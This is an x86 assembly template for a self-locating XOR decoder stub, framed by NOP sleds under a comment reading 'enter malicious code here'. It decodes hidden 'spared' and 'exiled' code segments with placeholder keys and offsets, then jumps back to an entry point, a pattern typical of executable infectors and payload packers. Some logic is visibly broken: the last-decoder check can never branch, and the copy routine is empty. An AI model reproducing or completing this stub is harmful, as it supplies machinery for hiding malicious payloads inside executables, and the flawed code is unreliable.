global _start
  
section .text

_start:
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
; -------------------------------------------
; enter malicious code here
; -------------------------------------------

    call    get_current_addr            ; push return address

get_current_addr:
    pop     eax                         ; pop current address
    sub     eax, 0x5                    ; eax = address of entry point, 0x5 = size of call instruction

    mov     edi, <IS_LAST>              ; 1 if last decoder, 0 otherwise
    xor     ebx, ebx                    ; clear registers
    xor     ecx, ecx                    ;
    
    mov     bl,  <DECODER_KEY>          ; decoder key
    mov     ecx, <SPARED_CODE_SIZE>     ; spared code size
    jmp     get_spared_code_addr
    
spared_code_decoder_loop:
    mov     edx, esi                    ; construct encoded byte address
    add     edx, ecx                    ;
    dec     edx                         ;
    xor     byte [edx], bl              ; decode
    loop    spared_code_decoder_loop    ; loop back
    
    add     esi, <EXILED_CODE_OFFSET>   ; esi = address of exiled code in last section
    mov     ecx, <EXILED_CODE_SIZE>     ; exiled code size

exiled_code_decoder_loop:
    mov     edx, esi                    ; construct encoded byte address
    add     edx, ecx                    ;
    dec     edx                         ;
    xor     byte [edx], bl              ; decode
    loop    exiled_code_decoder_loop    ; loop back
    test    edi, 0x00                   ; check if zero
    jz      next_decoder 
    jmp     copy_exiled_code

copy_exiled_code:
    ; copy

    jmp     eax                         ; jump back to decoded code (entry point)
    
pop_spared_code_address:
    pop     esi                         ; pop current address
    add     esi, 0x2                    ; esi = address of spared code byte
    jmp     spared_code_decoder_loop

get_spared_code_addr:
    call pop_spared_code_address        ; push return address

next_decoder:

; -------------------------------------------
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop